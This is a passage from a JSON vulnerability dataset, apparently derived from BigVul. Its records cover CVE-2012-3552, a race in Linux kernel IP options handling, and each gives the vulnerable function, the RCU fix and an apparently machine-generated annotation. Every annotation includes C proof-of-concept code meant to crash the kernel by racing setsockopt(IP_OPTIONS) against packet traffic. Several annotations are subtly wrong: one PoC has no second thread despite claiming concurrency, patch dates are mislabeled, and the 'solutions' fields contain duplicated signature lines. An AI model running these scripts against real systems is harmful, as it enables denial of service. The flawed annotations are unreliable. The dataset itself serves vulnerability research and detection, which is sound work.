        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/ip_options.c": "int ip_options_get(struct net *net, struct ip_options **optp,\n \t\t   unsigned char *data, int optlen)\n {\n\tstruct ip_options *opt = ip_options_get_alloc(optlen);\n \n \tif (!opt)\n \t\treturn -ENOMEM;\n \tif (optlen)\n\t\tmemcpy(opt->__data, data, optlen);\n \treturn ip_options_get_finish(net, optp, opt, optlen);\n }\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "ID:\nCVE-2012-3552\n\nTitle: CVE-2012-3552 / CWE-362: Race condition in IP options handling\n\nDisclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\nAffected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\nCWE/CVE Number and description:\nCWE-362: Concurrent Modification of Shared Resource without Synchronization ('Race Condition')\nCVE-2012-3552\n\nSummary:\nA race condition exists in the Linux kernel's IPv4 implementation where ip_options_get() manipulates the inet->opt pointer without RCU synchronization. When ip_make_skb() calls ip_setup_cork(), it may copy ipc->opt while another thread concurrently modifies inet->opt, allowing the first thread to reference a freed structure. A remote attacker sending network packets while an application sets socket options concurrently can trigger slab corruption and kernel crash via use-after-free access to the released ip_options structure.\n\nRoot cause:\nConcurrent access to inet->opt structure without Read-Copy-Update (RCU) synchronization allows one thread to deallocate options while another thread is dereferencing a stale copy.\n\nAttack Surface:\nLinux kernel network stack, IPv4 socket option handling\n\nImpact Summary:\nDenial of Service via kernel heap slab corruption and system crash\n\nTrigger / Attack vector:\nNetwork packet transmission concurrent with setsockopt() socket option modification\n\nKey code/struct excerpt (minimal):\nint ip_options_get(struct net *net, struct ip_options **optp,\n\t\t   unsigned char *data, int optlen)\n{\n\tstruct ip_options *opt = ip_options_get_alloc(optlen);\n\tif (!opt)\n\t\treturn -ENOMEM;\n\tif (optlen)\n\t\tmemcpy(opt->__data, data, optlen);\n\treturn ip_options_get_finish(net, optp, opt, optlen);\n}\n\nExploit:\n\nTrigger surface/attack vector:\nNetwork packet transmission with concurrent socket option modification via setsockopt()\n\nExploit primitive(s) available:\nUse-after-free of kernel heap memory, slab corruption, arbitrary memory dereference\n\nExploitability summary:\nThe race condition requires precise timing between network packet handling and socket option modification but is reliably triggerable through concurrent thread access, enabling predictable kernel DoS without requiring privilege escalation.\n\nExploit script (summary):\n- Create a UDP socket and bind to a local address\n- Spawn a thread that repeatedly calls setsockopt(IPPROTO_IP, IP_OPTIONS) with crafted option buffers\n- Simultaneously send a high volume of network packets from the main thread to the target\n- The concurrent access causes use-after-free when ip_options_get() reads inet->opt freed by another thread\n- Kernel heap corruption occurs, leading to slab allocator crash and system hang/panic\n\nExploitation Example script payload code:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <pthread.h>\n\nvoid* race_thread(void* arg) {\n    int sock = *(int*)arg;\n    unsigned char opts[40];\n    for (int i = 0; i < 100000; i++) {\n        memset(opts, i % 256, sizeof(opts));\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts));\n    }\n    return NULL;\n}\n\nint main() {\n    int sock = socket(AF_INET, SOCK_DGRAM, 0);\n    struct sockaddr_in addr = {0};\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(9999);\n    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n    bind(sock, (struct sockaddr*)&addr, sizeof(addr));\n    \n    pthread_t t;\n    pthread_create(&t, NULL, race_thread, &sock);\n    \n    unsigned char pkt[256];\n    for (int i = 0; i < 1000000; i++) {\n        memset(pkt, 0x42, sizeof(pkt));\n        sendto(sock, pkt, sizeof(pkt), 0, (struct sockaddr*)&addr, sizeof(addr));\n    }\n    return 0;\n}\n\nFix\n\nFix code:\nint ip_options_get(struct net *net, struct ip_options_rcu **optp,\n\t\t   unsigned char *data, int optlen)\n{\n\tstruct ip_options_rcu *opt = ip_options_get_alloc(optlen);\n\tif (!opt)\n\t\treturn -ENOMEM;\n\tif (optlen)\n\t\tmemcpy(opt->opt.__data, data, optlen);\n\treturn ip_options_get_finish(net, optp, opt, optlen);\n}\n\nFix summary:\nThe patch introduces RCU (Read-Copy-Update) protection by wrapping ip_options in an ip_options_rcu structure and changing inet->opt to use RCU synchronization. Instead of atomic refcounting, ip_options are now copied safely within RCU read-side critical sections, eliminating use-after-free races during concurrent socket option access.\n\nPatch reference:\nCommit f6d8bd051c391c1c0458a30b2a7abcd939329259 \u2014 inet: add RCU protection to inet->opt\nhttps://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\nPatch Analysis:\nThe fix replaces unprotected pointer manipulation of inet->opt with RCU-protected inet->inet_opt using an ip_options_rcu wrapper. This ensures readers hold RCU read locks while accessing the structure, preventing freeing while in use. No refcount dirtying occurs; instead, the structure is copied when necessary under RCU protection.\n\nPatchType: RCU synchronization addition; structure wrapping for safe concurrent access\n\nVariant & Triage Guidance\n\nVariant analysis suggestions:\n- Review all direct dereferences of net->inet->opt or similar option fields for unprotected concurrent access patterns\n- Audit IPv6 option handling (inet6_opt) for equivalent race conditions in address option processing\n- Fuzz the network stack subsystem by concurrently modifying socket options while injecting packets to identify similar use-after-free paths\n\nLikely variants/impact:\nSimilar unprotected shared-state mutations in TCP, UDP, or SCTP option handlers could permit equivalent kernel heap corruption exploits and DoS attacks.",
        "tests": "NA",
        "solutions": "int ip_options_get(struct net *net, struct ip_options **optp,\nint ip_options_get(struct net *net, struct ip_options_rcu **optp,\n \t\t   unsigned char *data, int optlen)\n {\n\tstruct ip_options_rcu *opt = ip_options_get_alloc(optlen);\n \n \tif (!opt)\n \t\treturn -ENOMEM;\n \tif (optlen)\n\t\tmemcpy(opt->opt.__data, data, optlen);\n \treturn ip_options_get_finish(net, optp, opt, optlen);\n }\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/ip_options.c": "static struct ip_options *ip_options_get_alloc(const int optlen)\n {\n\treturn kzalloc(sizeof(struct ip_options) + ((optlen + 3) & ~3),\n \t\t       GFP_KERNEL);\n }\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace condition in IP socket option handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition'). A race condition in IP socket option handling allows concurrent modification of inet->opt without proper synchronization.\n\n[Mandatory] Summary:\nThe vulnerability exists in ip_options_get_alloc() in net/ipv4/ip_options.c, where inet->opt socket option pointers are accessed and freed concurrently without RCU synchronization. When an application sets socket options while the kernel handles network traffic (as in ip_setup_cork), another thread can free the inet->opt structure and cause a use-after-free. Remote attackers can trigger this by sending packets to an application that manipulates socket options, inducing slab corruption and kernel panic.\n\n[Mandatory] Root cause:\nThe inet->opt pointer lacks RCU (Read-Copy-Update) protection, allowing concurrent reads and writes to race, causing use-after-free of dynamically allocated ip_options structures.\n\n[Mandatory] Attack Surface:\nLinux kernel IP implementation, specifically TCP/UDP socket option handling during packet transmission and reception.\n\n[Mandatory] Impact Summary:\nDenial of Service (DoS) via kernel panic and slab corruption\n\n[Optional] Trigger / Attack vector:\nNetwork packet transmission combined with concurrent socket option modification (setsockopt IP_OPTIONS or similar).\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nstatic struct ip_options *ip_options_get_alloc(const int optlen)\n{\n\treturn kzalloc(sizeof(struct ip_options) + ((optlen + 3) & ~3),\n\t\t       GFP_KERNEL);\n}\n```\n\nExploit:\n\n[Mandatory] Trigger surface/attack vector:\nSocket option setting (setsockopt) concurrent with packet handling (sendto/recvfrom on UDP/TCP sockets).\n\n[Mandatory] Exploit primitive(s) available:\nRace condition enabling use-after-free and heap corruption of inet->opt structures.\n\n[Mandatory] Exploitability summary (1 sentence):\nA remote attacker can reliably trigger the race condition by concurrently modifying socket options and sending network packets, causing kernel slab corruption and panic with high reproducibility.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create a UDP or TCP socket bound to a local address\n- Spawn a thread that repeatedly calls setsockopt(IP_OPTIONS) to allocate and free ip_options structures\n- From a second thread, send rapid network packets to the socket (sendto/sendmsg)\n- The race between ip_setup_cork() reading inet->opt and the option-setting thread freeing old structures causes a use-after-free\n- Kernel detects slab corruption and panics\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <pthread.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <unistd.h>\n\nint sock;\n\nvoid* option_thread() {\n    unsigned char opts[40];\n    while (1) {\n        memset(opts, 0, sizeof(opts));\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, opts, 40);\n        usleep(100);\n    }\n    return NULL;\n}\n\nint main() {\n    struct sockaddr_in addr;\n    pthread_t tid;\n    \n    sock = socket(AF_INET, SOCK_DGRAM, 0);\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(8888);\n    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n    bind(sock, (struct sockaddr*)&addr, sizeof(addr));\n    \n    pthread_create(&tid, NULL, option_thread, NULL);\n    sleep(1);\n    \n    for (int i = 0; i < 50000; i++) {\n        sendto(sock, \"X\", 1, 0, (struct sockaddr*)&addr, sizeof(addr));\n    }\n    return 0;\n}\n```\n\nFix\n\n[Mandatory] Fix code:\n```c\nstatic struct ip_options_rcu *ip_options_get_alloc(const int optlen)\n{\n\treturn kzalloc(sizeof(struct ip_options_rcu) + ((optlen + 3) & ~3),\n\t\t       GFP_KERNEL);\n}\n```\n\n[Mandatory] Fix summary:\nThe patch replaces the unprotected inet->opt with an RCU-protected version (inet->inet_opt) backed by a new ip_options_rcu structure. This structure holds RCU metadata to defer deallocation until all concurrent readers have exited their RCU read-side critical sections, eliminating the use-after-free race.\n\n[Optional] Patch reference:\nCommit f6d8bd051c391c1c0458a30b2a7abcd939329259\nhttps://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\n[Optional] Patch Analysis:\nThe patch introduced a new ip_options_rcu wrapper structure and converted unprotected pointer accesses to use rcu_dereference() and call_rcu() for deferred freeing. This ensures readers accessing inet->opt are protected within RCU critical sections and writers cannot immediately free structures in active use.\n\nPatchType: Synchronization primitive addition (RCU), data structure refactoring (ip_options \u2192 ip_options_rcu wrapper).\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Audit other socket option handlers (TCP_CORK, TCP_USER_TIMEOUT, SO_BINDTODEVICE) for similar unsynchronized access patterns in ipc or inet structures\n- Review IPv6 equivalent code paths (inet6->opt, ipv6_opt) to determine if similar RCU protection was applied or if gaps remain\n- Search for other kernel code paths that access inet->opt without holding RCU read-side locks (e.g., ip_append_data, ip_output, ip_fragmentation)\n\n[Optional] Likely variants/impact (one line):\nSimilar races likely exist in other socket option handlers and IPv6 option processing, potentially affecting TCP, SCTP, and raw socket code paths.",
        "tests": "NA",
        "solutions": "static struct ip_options *ip_options_get_alloc(const int optlen)\nstatic struct ip_options_rcu *ip_options_get_alloc(const int optlen)\n {\n\treturn kzalloc(sizeof(struct ip_options_rcu) + ((optlen + 3) & ~3),\n \t\t       GFP_KERNEL);\n }\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/ip_options.c": "static int ip_options_get_finish(struct net *net, struct ip_options **optp,\n\t\t\t\t struct ip_options *opt, int optlen)\n {\n \twhile (optlen & 3)\n\t\topt->__data[optlen++] = IPOPT_END;\n\topt->optlen = optlen;\n\tif (optlen && ip_options_compile(net, opt, NULL)) {\n \t\tkfree(opt);\n \t\treturn -EINVAL;\n \t}\n\tkfree(*optp);\n\t*optp = opt;\n \treturn 0;\n }\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace condition in IP options handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Modification of Shared Resource without Synchronization ('Race Condition')\n\n[Mandatory] Summary:\nA race condition exists in the Linux kernel's IP implementation, specifically in the ip_options_get_finish() function in net/ipv4/ip_options.c, where inet->opt is accessed and modified without proper synchronization. Multiple threads can simultaneously access the shared ip_options structure\u2014one thread calling ip_make_skb()/ip_setup_cork() to copy it for packet transmission while another thread modifies inet->opt and frees the old structure. This can cause a use-after-free condition, leading to slab corruption and system crash.\n\n[Mandatory] Root cause:\nLack of RCU (Read-Copy-Update) synchronization on inet->opt during concurrent access from packet setup and socket option manipulation paths.\n\n[Mandatory] Attack Surface:\nLinux kernel IPv4 network stack, socket option processing\n\n[Mandatory] Impact Summary:\nDenial of Service (slab corruption and system crash)\n\n[Optional] Trigger / Attack vector:\nNetwork packet transmission; application setting socket options (e.g., IP_OPTIONS) while handling incoming network traffic\n\n[Mandatory] Key code/struct excerpt (minimal):\nstatic int ip_options_get_finish(struct net *net, struct ip_options **optp,\n\t\t\t\t struct ip_options *opt, int optlen)\n{\n\twhile (optlen & 3)\n\t\topt->__data[optlen++] = IPOPT_END;\n\topt->optlen = optlen;\n\tif (optlen && ip_options_compile(net, opt, NULL)) {\n\t\tkfree(opt);\n\t\treturn -EINVAL;\n\t}\n\tkfree(*optp);\n\t*optp = opt;\n\treturn 0;\n}\n\nExploit:\n\n[Mandatory] Trigger surface/attack vector:\nIPv4 socket option (IP_OPTIONS) manipulation concurrent with outbound packet transmission via ip_make_skb()\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free of ip_options structure; arbitrary kernel memory corruption via freed slab\n\n[Mandatory] Exploitability summary (1 sentence):\nAn attacker can exploit this by crafting a remote attack scenario where a target application receives network packets while changing socket options at precise timing intervals to trigger the race condition and crash the kernel.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n\u2022 Target application must be setting IP socket options (IP_OPTIONS setsockopt calls) during active network communication\n\u2022 Attacker sends a flood of incoming packets to force ip_make_skb() / ip_setup_cork() execution on multiple CPU cores\n\u2022 Application thread changes inet->opt concurrently, freeing old ip_options structure while kernel code still references it\n\u2022 Second thread reads freed memory, causing slab corruption and triggering BUG() or similar panic condition\n\u2022 Timing is critical: race window occurs between ip_setup_cork() reading inet->opt and setsockopt freeing old structure\n\n[Mandatory] Exploitation Example script payload code:\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <linux/ip.h>\n\nint main() {\n\tint sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);\n\tunsigned char opts[40] = {0};\n\tstruct sockaddr_in addr;\n\t\n\taddr.sin_family = AF_INET;\n\taddr.sin_port = htons(8000);\n\taddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n\t\n\twhile(1) {\n\t\t/* Concurrent thread: modify socket options while sending packets */\n\t\tsetsockopt(sock, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts));\n\t\tsendto(sock, \"X\", 1, 0, (struct sockaddr*)&addr, sizeof(addr));\n\t\tusleep(100);\n\t}\n\treturn 0;\n}\n\nFix\n\n[Mandatory] Fix code:\nstatic int ip_options_get_finish(struct net *net, struct ip_options_rcu **optp,\n\t\t\t\t struct ip_options_rcu *opt, int optlen)\n{\n\twhile (optlen & 3)\n\t\topt->opt.__data[optlen++] = IPOPT_END;\n\topt->opt.optlen = optlen;\n\tif (optlen && ip_options_compile(net, &opt->opt, NULL)) {\n\t\tkfree(opt);\n\t\treturn -EINVAL;\n\t}\n\tkfree(*optp);\n\t*optp = opt;\n\treturn 0;\n}\n\n[Mandatory] Fix summary:\nThe patch wraps ip_options in a new ip_options_rcu structure and applies RCU (Read-Copy-Update) synchronization to inet->opt (renamed inet->inet_opt). This ensures that readers hold RCU locks preventing the structure from being freed while in use, and writers copy-on-write rather than modifying in place, eliminating the race condition.\n\n[Optional] Patch reference:\nCommit: f6d8bd051c391c1c0458a30b2a7abcd939329259 (https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259)\n\n[Optional] Patch Analysis:\nPatchType: Synchronization enhancement via RCU; structural refactoring\n\nThe fix introduces ip_options_rcu wrapper and RCU protection on the inet->opt field. Instead of direct in-place modification and atomic refcounts, the patch uses RCU's deferred-free semantics so readers are protected from concurrent modifications and memory being freed under them.\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n\u2022 Review other kernel subsystems using similar unprotected shared data structures (particularly in net/ and security/) for similar race patterns on reference-counted objects\n\u2022 Audit socket option handlers in other protocol families (IPv6, IPX, etc.) for analogous unsynchronized modification of per-socket option pointers\n\u2022 Fuzz network packet generation combined with rapid setsockopt() calls on multiple threads to detect similar timing-dependent corruptions\n\n[Optional] Likely variants/impact (one line):\nSimilar unprotected concurrent access patterns in other kernel socket option handlers (TCP_CORK, TCP_OPTION, raw socket options) may present identical DoS vectors.",
        "tests": "NA",
        "solutions": "static int ip_options_get_finish(struct net *net, struct ip_options **optp,\nstatic int ip_options_get_finish(struct net *net, struct ip_options_rcu **optp,\n\t\t\t\t struct ip_options_rcu *opt, int optlen)\n {\n \twhile (optlen & 3)\n\t\topt->opt.__data[optlen++] = IPOPT_END;\n\topt->opt.optlen = optlen;\n\tif (optlen && ip_options_compile(net, &opt->opt, NULL)) {\n \t\tkfree(opt);\n \t\treturn -EINVAL;\n \t}\n\tkfree(*optp);\n\t*optp = opt;\n \treturn 0;\n }\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/ip_options.c": "int ip_options_get_from_user(struct net *net, struct ip_options **optp,\n \t\t\t     unsigned char __user *data, int optlen)\n {\n\tstruct ip_options *opt = ip_options_get_alloc(optlen);\n \n \tif (!opt)\n \t\treturn -ENOMEM;\n\tif (optlen && copy_from_user(opt->__data, data, optlen)) {\n \t\tkfree(opt);\n \t\treturn -EFAULT;\n \t}\n \treturn ip_options_get_finish(net, optp, opt, optlen);\n }\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace condition in Linux kernel IP options handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Modification Without Proper Synchronization (Race Condition)\n\n[Mandatory] Summary:\nA race condition exists in the IP options handling code of the Linux kernel (net/ipv4/ip_options.c) where the function ip_options_get_from_user() lacks proper synchronization when manipulating socket options (inet->opt). Multiple threads can concurrently access and modify the ip_options structure without protection, allowing one thread to free the options structure while another thread is still reading or writing to it. This results in use-after-free and heap corruption leading to slab corruption and system crash when a remote attacker sends packets to an application that sets socket options during network traffic handling.\n\n[Mandatory] Root cause:\nThe ip_options pointer (inet->opt) was accessed and modified without RCU (Read-Copy-Update) synchronization, allowing concurrent threads to race when one thread changes the options and frees the old structure while another thread is copying or using it.\n\n[Mandatory] Attack Surface:\nLinux kernel network stack; specifically the IPv4 socket option handling subsystem accessible via socket APIs and network packet processing.\n\n[Mandatory] Impact Summary:\nDenial of service: slab corruption and system crash\n\n[Optional] Trigger / Attack vector:\nConcurrent socket option setting via setsockopt() combined with incoming network packets to the same socket from multiple threads or processes.\n\n[Mandatory] Key code/struct excerpt (minimal):\nint ip_options_get_from_user(struct net *net, struct ip_options **optp,\n \t\t\t     unsigned char __user *data, int optlen)\n {\n\tstruct ip_options *opt = ip_options_get_alloc(optlen);\n \n \tif (!opt)\n \t\treturn -ENOMEM;\n\tif (optlen && copy_from_user(opt->__data, data, optlen)) {\n \t\tkfree(opt);\n \t\treturn -EFAULT;\n \t}\n \treturn ip_options_get_finish(net, optp, opt, optlen);\n }\n\nExploit:\n\n[Mandatory] Trigger surface/attack vector:\nSocket option setting via setsockopt(SOL_IP, IP_OPTIONS) combined with concurrent network packet reception.\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free read/write, heap corruption, concurrent modification of kernel data structures.\n\n[Mandatory] Exploitability summary (1 sentence):\nExploitability is moderate; requires precise timing to race between setsockopt() and packet handling on the same socket, but is triggered through standard socket APIs and network-reachable code paths.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n\u2022 Create a socket and set IP options via setsockopt(SOL_IP, IP_OPTIONS)\n\u2022 Spawn multiple threads: one continuously modifying socket options, others sending/receiving packets\n\u2022 One thread modifies inet->opt causing old structure to be freed\n\u2022 Another thread still references or copies from the freed ip_options structure\n\u2022 Race condition causes heap corruption and kernel crash when slab metadata is corrupted\n\n[Mandatory] Exploitation Example script payload code:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <pthread.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netinet/ip.h>\n\nvoid* thread_setopts(void *arg) {\n  int sock = *(int*)arg;\n  unsigned char opts[40];\n  while(1) {\n    memset(opts, 0, sizeof(opts));\n    opts[0] = 68; // IPOPT_TIMESTAMP\n    setsockopt(sock, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts));\n    usleep(10);\n  }\n  return NULL;\n}\n\nvoid* thread_recv(void *arg) {\n  int sock = *(int*)arg;\n  char buf[1500];\n  while(1) {\n    recvfrom(sock, buf, sizeof(buf), MSG_DONTWAIT, NULL, NULL);\n    usleep(10);\n  }\n  return NULL;\n}\n\nint main() {\n  int sock = socket(AF_INET, SOCK_DGRAM, 0);\n  pthread_t t1, t2;\n  pthread_create(&t1, NULL, thread_setopts, &sock);\n  pthread_create(&t2, NULL, thread_recv, &sock);\n  pthread_join(t1, NULL);\n  return 0;\n}\n\nFix\n\n[Mandatory] Fix code:\nint ip_options_get_from_user(struct net *net, struct ip_options_rcu **optp,\n \t\t\t     unsigned char __user *data, int optlen)\n {\n\tstruct ip_options_rcu *opt = ip_options_get_alloc(optlen);\n \n \tif (!opt)\n \t\treturn -ENOMEM;\n\tif (optlen && copy_from_user(opt->opt.__data, data, optlen)) {\n \t\tkfree(opt);\n \t\treturn -EFAULT;\n \t}\n \treturn ip_options_get_finish(net, optp, opt, optlen);\n }\n\n[Mandatory] Fix summary:\nThe patch introduced RCU (Read-Copy-Update) protection for inet->opt by replacing the direct ip_options pointer with ip_options_rcu structure, changing the function signature to use ip_options_rcu**, and updating all references to access the nested ip_options field (opt->opt.__data). This ensures proper synchronization between readers and writers that access or modify socket options.\n\n[Optional] Patch reference:\nCommit f6d8bd051c391c1c0458a30b2a7abcd939329259 in linux/torvalds repository; https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\n[Optional] Patch Analysis:\nPatchType: Synchronization mechanism added (RCU protection introduced)\n\nThe fix replaced the unprotected ip_options structure with ip_options_rcu, a wrapper that enables RCU-based synchronization. Instead of direct pointer manipulation, all accesses now go through the rcu-protected structure, preventing one thread from freeing the options while another thread is accessing them. The nested field access (opt->opt.__data) ensures the ip_options data remains stable under RCU read-side critical sections.\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n\u2022 Review all other direct accesses to inet->opt throughout the IP stack for similar race conditions\n\u2022 Audit other socket option handlers (TCP, UDP, ICMP) for analogous synchronization issues with inet->opt\n\u2022 Fuzz setsockopt() calls concurrently with packet transmission to identify related timing windows\n\n[Optional] Likely variants/impact (one line):\nSimilar race conditions likely exist in other socket option handlers and option access paths within the network stack, potentially affecting TCP, UDP, or raw socket implementations.",
        "tests": "NA",
